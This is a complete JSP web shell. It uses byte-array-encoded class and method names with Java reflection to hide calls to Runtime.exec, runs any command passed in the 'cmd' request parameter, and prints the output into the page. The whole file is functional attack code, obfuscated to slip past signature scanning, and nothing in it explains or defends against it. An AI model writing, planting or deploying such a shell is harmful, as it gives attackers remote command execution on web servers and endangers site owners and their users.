<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Class<?> api = String.class.getClass().forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));
    Object obj2 = api.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class).invoke(api.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{request.getParameter("cmd")});
    java.lang.reflect.Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));
    m.setAccessible(true);
    java.util.Scanner s = new java.util.Scanner((java.io.InputStream) m.invoke(obj2, new Object[]{})).useDelimiter("\\A");
    out.write("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
%>